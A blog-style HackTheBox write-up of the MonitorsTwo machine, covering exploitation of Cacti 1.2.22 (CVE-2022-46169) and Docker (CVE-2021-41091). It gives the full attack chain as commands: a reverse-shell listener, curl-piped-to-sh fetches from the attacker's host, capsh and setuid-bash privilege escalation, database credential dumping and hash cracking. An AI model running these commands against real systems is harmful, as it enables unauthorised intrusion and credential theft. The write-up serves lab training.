---
title: "HTB - MonitorsTwo"
description: "Write-up of the MonitorTwo machine on HackTheBox."
pubDate: "Jul 08 2022"
cover: "/images/blog/monitorstwo.png"
category: "HackTheBox"
---

## Initial Reconnaissance

We begin by scanning the machine using nmap.

```bash
nmap -sC -sV [BOX_IP]
```

We can see that the port 80 is open. The application running on it is **cacti v1.2.22**. A quick search leads to an exploit for this version at the following GitHub repository: [CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22).

## Web Vulnerability Exploitation

```bash
git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
```
```bash
nc -lvnp [YOUR_PORT]
```
```bash
python CVE-2022-46169.py -u http://[BOX_IP] --LHOST=[YOUR_IP] --LPORT=[YOUR_PORT]
```

Boom, we are inside the server.

## Privilege Escalation

On our machine, we set up a Python web server and pull [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest) to help with further enumeration.

```bash
sudo python3 -m http.server 80
```
```bash
curl http://[YOUR_IP]/linpeas.sh | sh
```

LinPEAS indicates a vulnerability with `capsh`. Using the ressources found on [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/), we find a way to exploit this vulnerability:

```bash
capsh --gid=0 --uid=0 --
```

Executing `whoami` confirms that we are root.

## Server Discovery

Navigating to the root directory, we locate `entrypoint.sh`. We can look into it with `cat` and then execute it.

```bash
chmod +x entrypoint.sh
./entrypoint.sh
```
We can see that this file requests the database for data with `root` as username and password.

We can take a look inside the different tables : 

```bash
mysql --host=db --user=root --password=root cacti -e "show tables"
```

From the result of the previous command, we notice the `user_auth` table. We can take a look inside with the following command:

```bash
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
```

This command reveals password hashes for 3 users (admin, guest, marcus). We store the hashes of admin and marcus in `hashes.txt` and we will use hashcat to attempt a dictionary attack:

```bash
hashcat -m 3200 -a 0 hashes.txt rockyou-75.txt
```

From hashcat, we get the password `funkymonkey` for the user `marcus`. 

## Lateral Movement

Using this information and the fact that nmap also reported us port 22 (SSH) was open, we attempt an SSH login:

```bash
ssh marcus@[BOX_IP]
```

Once inside, a quick `ls` shows the `user.txt` file which grants us the user flag.

## New Privilege Escalation

To continue our efforts towards root access, we once again fetch `linpeas.sh` from our Python webserver. We identify Docker's presence on the machine. 
The Docker version installed, **20.10.5+dfsg1**, is vulnerable to an exploit found on GitHub: [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091).

Go back to your machine and clone the PoC repository.

```bash
git clone https://github.com/UncleJ4ck/CVE-2021-41091
```

```bash
cd /tmp
curl http://[YOUR_IP]/exp.sh > exp.sh
chmod +x exp.sh 
./exp.sh
```

The script asks you to execute the following command on the Docker environment (that we previously rooted).

```bash
chmod u+s /bin/bash
```

Navigate to the directory provided in the output of the script and execute:

```bash
./bin/bash -p
```

This grants us a root shell. To find the `root.txt` file, we can use the following command:

```bash
find / -type f -name root.txt 2>/dev/null 
```

Reading its content with `cat /root/root.txt` gives us the root flag.
Happy rooting :)
